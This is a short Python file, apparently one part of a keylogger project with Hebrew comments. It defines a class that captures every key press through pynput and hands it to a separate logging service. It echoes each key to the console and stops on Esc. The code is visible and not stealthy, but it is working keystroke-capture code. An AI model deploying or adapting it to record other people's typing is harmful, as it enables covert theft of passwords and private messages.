from pynput.keyboard import Listener, Key
from key_logger_service import KeyLoggerService

class KeyListener:
    def __init__(self):
        self.logger = KeyLoggerService()
        self.listener = None

    def on_press(self, key):
        """ מאזין ללחיצות מקשים ומעביר אותן לרישום """
        key_name = self.logger.get_key_format(key)
        self.logger.log_key(key_name)

        print(f"You pressed '{key_name}'")

        if key == Key.esc:
            print("\nExiting program...")
            self.stop_listening()

    def start_listening(self):
        """ מתחיל להאזין למקלדת """
        self.logger.start_logging()
        try:
            with Listener(on_press=self.on_press) as listener:
                self.listener = listener
                listener.join()
        except KeyboardInterrupt:
            print("\nProgram stopped by user.")

    def stop_listening(self):
        """ מפסיק את ההאזנה למקלדת """
        if self.listener:
            self.listener.stop()
        self.logger.stop_logging()
